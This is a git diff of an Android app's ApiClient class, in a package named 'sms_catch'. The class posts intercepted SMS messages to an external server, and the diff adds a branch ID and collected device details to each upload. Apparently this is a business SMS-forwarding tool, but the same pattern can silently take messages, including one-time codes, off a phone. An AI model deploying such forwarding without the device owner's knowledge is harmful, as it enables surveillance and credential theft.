@@ -1,10 +1,15 @@
 package com.qbitspark.sms_catch;
 
+import static android.content.Context.MODE_PRIVATE;
+
+import android.annotation.SuppressLint;
 import android.content.Context;
+import android.content.SharedPreferences;
 import android.util.Log;
 
 
 import androidx.annotation.NonNull;
+import androidx.annotation.RequiresPermission;
 
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -22,17 +27,21 @@ import okhttp3.Response;
 public class ApiClient {
 
     private static final String TAG = "ApiClient";
+    //private static final String API_ENDPOINT = "http://192.168.1.4:8080/messages";
     private static final String API_ENDPOINT = "https://onepostz.xyz/api/callback/message";
     private static final MediaType JSON = MediaType.parse("application/json; charset=utf-8");
     private static final OkHttpClient client = new OkHttpClient();
 
+
+    @RequiresPermission("android.permission.READ_PRIVILEGED_PHONE_STATE")
     public static void sendMessage(final Context context, final MessageData messageData) {
         try {
-            // Create JSON payload
-            JSONObject jsonPayload = new JSONObject();
-            jsonPayload.put("sender", messageData.getSender());
-            jsonPayload.put("message", messageData.getMessageBody());
-            jsonPayload.put("timestamp", messageData.getTimestamp());
+
+            // Check if branch ID exists in SharedPreferences
+            SharedPreferences sharedPreferences = context.getSharedPreferences("AppPrefs", MODE_PRIVATE);
+            String savedBranchId = sharedPreferences.getString("BRANCH_ID", null);
+
+            JSONObject jsonPayload = getJsonObject(context, messageData, savedBranchId);
 
             RequestBody body = RequestBody.create(jsonPayload.toString(), JSON);
             Request request = new Request.Builder()
@@ -71,5 +80,20 @@ public class ApiClient {
         } catch (JSONException e) {
             Log.e(TAG, "JSON error: " + e.getMessage());
         }
+    }
+
+    @RequiresPermission("android.permission.READ_PRIVILEGED_PHONE_STATE")
+    @NonNull
+    private static JSONObject getJsonObject(Context context, MessageData messageData, String savedBranchId) throws JSONException {
+        DeviceDetailsCollector deviceDetailsCollector = new DeviceDetailsCollector(context);
+
+        // Create JSON payload
+        JSONObject jsonPayload = new JSONObject();
+        jsonPayload.put("branchId", savedBranchId);
+        jsonPayload.put("sender", messageData.getSender());
+        jsonPayload.put("message", messageData.getMessageBody());
+        jsonPayload.put("timestamp", messageData.getTimestamp());
+        jsonPayload.put("deviceDetails", deviceDetailsCollector.getAllDeviceDetailsJson());
+        return jsonPayload;
     }
 }
